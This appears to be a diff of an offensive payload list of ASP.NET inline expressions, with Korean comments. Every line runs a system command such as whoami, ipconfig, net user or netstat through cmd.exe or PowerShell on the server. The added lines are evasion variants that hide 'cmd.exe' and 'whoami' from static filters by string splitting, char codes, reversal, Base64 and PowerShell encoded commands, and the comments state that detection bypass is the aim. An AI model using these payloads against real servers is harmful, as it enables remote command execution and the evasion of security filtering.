@@ -1,32 +1,30 @@
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c whoami").StandardOutput.ReadToEnd() %>
-' 현재 IIS 프로세스를 실행 중인 계정권한 확인
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c ipconfig /all").StandardOutput.ReadToEnd() %>
-' 서버의 네트워크 어댑터 및 IP 구성 정보 상세 출력
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c dir " + Server.MapPath(".")).StandardOutput.ReadToEnd() %>
-' 현재 웹 디렉터리 내의 파일 및 폴더 목록 출력
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c dir " + Server.MapPath("..")).StandardOutput.ReadToEnd() %>
-' 상위 웹 디렉터리 내의 파일 및 폴더 목록 출력
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c tasklist").StandardOutput.ReadToEnd() %>
-' 서버에서 현재 실행 중인 모든 프로세스 목록 조회
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c netstat -ano").StandardOutput.ReadToEnd() %>
-' 서버의 열려있는 포트 및 연결된 네트워크 소켓 목록 확인
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c net user").StandardOutput.ReadToEnd() %>
-' 서버에 등록된 OS 사용자 계정 목록 출력
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c systeminfo").StandardOutput.ReadToEnd() %>
-' OS 버전, 패치 내역, 시스템 아키텍처 등 전체 정보 조회
-<%= System.Diagnostics.Process.Start("powershell.exe", "-c whoami").StandardOutput.ReadToEnd() %>
-' PowerShell을 통해 실행 계정권한 확인
-<%= System.Diagnostics.Process.Start("powershell.exe", "-c Get-Process").StandardOutput.ReadToEnd() %>
-' PowerShell로 현재 실행 중인 프로세스 상세 정보 조회
-<%= System.Diagnostics.Process.Start("powershell.exe", "-c Get-Service").StandardOutput.ReadToEnd() %>
-' 서버에 등록되어 있는 Windows 서비스 목록 및 상태 조회
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 표준 출력을 명시적으로 리다이렉트하여 안정적으로 whoami 결과 수신
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c ipconfig /all") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 표준 출력을 리다이렉트하여 안정적으로 ipconfig 결과 수신
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 표준 출력을 리다이렉트하여 PowerShell whoami 결과 수신
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("c" + "md.e" + "xe", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 문자열 결합을 이용해 cmd.exe 정적 패턴 탐지를 우회하며 whoami 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ==")), "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' Base64 디코딩(Y21kLmV4ZQ== -> cmd.exe)을 통해 실행 파일명 키워드 감지를 우회하며 whoami 실행
+<%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %>
+' .NET API를 사용해 외부 프로세스 생성 없이 현재 실행 계정명 직접 조회
+<%= System.Environment.UserDomainName + "" + System.Environment.UserName %>
+' Environment 환경 변수 값을 조합하여 도메인 및 사용자 이름 직접 조회
+<%= System.Security.Principal.WindowsPrincipal.Current.Identity.Name %>
+' 현재 스레드의 WindowsPrincipal 보안 주체로부터 계정 식별자 조회
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(@"C:\Windows\System32\whoami.exe") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' cmd.exe를 거치지 않고 whoami.exe 바이너리를 직접 호출해 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("c" + "m" + "d" + "." + "e" + "x" + "e", "/c " + "w" + "h" + "o" + "a" + "m" + "i") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' cmd.exe 및 /c whoami 문자열을 잘라 결합하여 정적 필터링 우회
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(((char)99).ToString()+((char)109)+((char)100)+".exe", "/c "+((char)119)+((char)104)+((char)111)+((char)97)+((char)109)+((char)105)) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' ASCII 코드값(char)으로 명령어를 변환·결합하여 텍스트 기반 시그니처 감지 우회
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(new string(new char[]{'c','m','d','.','e','x','e'}), "/c " + new string(new char[]{'w','h','o','a','m','i'})) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' char 배열(Array) 형태로 인자값을 넘겨 인스턴스를 생성하는 우회
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(new string("exe.dmc".ToCharArray().Reverse().ToArray()), "/c " + new string("imaohw".ToCharArray().Reverse().ToArray())) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' 문자열을 역순으로 배치한 뒤 동적으로 반전(Reverse)시켜 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(@"C:\Windows\SysWOW64\cmd.exe", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' 32비트 하위 호환용 SysWOW64 경로의 cmd.exe를 호출하여 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"."+"e"+"x"+"e", "-c " + "w" + "h" + "o" + "a" + "m" + "i") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' PowerShell 실행 파일명을 결합 문자로 분할하여 호출
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("conhost.exe", "cmd.exe /c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' Windows 콘솔 호스트(conhost.exe) 하위로 명령어를 경유하여 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ==")), System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("L2Mgd2hvYW1p"))) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' 실행 대상 파일과 인자 전체를 Base64로 인코딩하여 동적 디코딩 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-e d2hvYW1p") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' PowerShell의 -EncodedCommand(-e) 옵션으로 Base64 명령어 수행
+<%= System.Diagnostics.Process.Start("cmd.exe", "/c whoami > " + Server.MapPath("w.txt")) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("w.txt")) %>
+' 실행 결과를 웹 디렉터리 텍스트 파일로 리다이렉션 후 ReadAllText로 확인
+<%= System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\Windows\Temp\w.txt") == null ? "" : System.IO.File.ReadAllText("C:\Windows\Temp\w.txt") %>
+' 실행 결과를 시스템 Temp 디렉터리 텍스트 파일로 리다이렉션 후 확인
